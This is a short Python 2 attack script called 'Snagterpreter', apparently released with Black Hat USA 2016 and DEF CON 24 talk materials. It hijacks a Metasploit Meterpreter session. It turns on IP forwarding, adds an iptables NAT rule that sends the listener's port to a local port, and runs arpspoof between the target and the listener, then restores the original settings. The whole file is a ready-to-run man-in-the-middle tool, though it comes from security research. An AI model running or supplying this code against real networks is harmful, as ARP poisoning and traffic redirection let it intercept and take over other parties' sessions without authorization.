#!/usr/bin/python
# Snagterpreter - Bare Bones Conference Version
#
# Wesley McGrew
# wesley.mcgrew@hornecyber.com
#
# This version is for distribution with 
# Black Hat USA 2016 and DEF CON 24 conference
# materials.
#
# For a more recent version, check http://hornecyber.com
#

import sys
import subprocess
import signal 

# Get arguments
if len(sys.argv) != 6:
	print 'Usage: %s <interface> <target ip> <listener ip> <listener port> <local port>' % sys.argv[0]
	sys.exit(1)

interface = sys.argv[1]
target_ip = sys.argv[2]
listener_ip = sys.argv[3]
listener_port = sys.argv[4]
local_port = sys.argv[5]

# Save old iptables
print '[*] Backing up your iptables rules'
old_ipt = subprocess.check_output("iptables-save")

# Save old ip forwarding status
print '[*] Saving your ip_forward status'
fp = open('/proc/sys/net/ipv4/ip_forward','r')
old_ipf = fp.read()
fp.close()

# Set ourselves up to IP forward
print '[*] Turning on ip_forward'
fp = open('/proc/sys/net/ipv4/ip_forward','w')
fp.write('1')
fp.close()

# Set NAT'ing to redirect meterpreter
print '[*] Setting NAT rule to steal the meterpreter agent'
print '[*]                  interface = ' + interface
print '[*]              listener port = ' + listener_port
print '[*]    our local listener port = ' + local_port
subprocess.call(['iptables','-t','nat','-A','PREROUTING','-i',interface,
	             '-p','tcp','--dport',listener_port,'-j','REDIRECT',
	             '--to-port',local_port])

# ARP spoof
print '[*]'
print '[*] "Look at me. I\'m the captain now."'
print '[*]'
print '[*] ARP Spoofing between %s and %s' % (target_ip, listener_ip)
try:
	as_process = subprocess.Popen(['arpspoof','-i',interface,'-t',target_ip,'-r',listener_ip])
	as_process.wait()
except KeyboardInterrupt:
	as_process.send_signal(signal.SIGINT)
	
# Restore old ip forwarding status
print '[*] Restoring your ip_forward status'
fp = open('/proc/sys/net/ipv4/ip_forward','w')
fp.write(old_ipf)
fp.close()

# Restore old iptables
print '[*] Restoring your iptables rules'
iptr_process = subprocess.Popen('iptables-restore', stdout=subprocess.PIPE, stdin=subprocess.PIPE)
iptr_process.communicate(input=old_ipt)[0]

print '[*] Waiting for arpspoof to fix things back up'
as_process.wait()
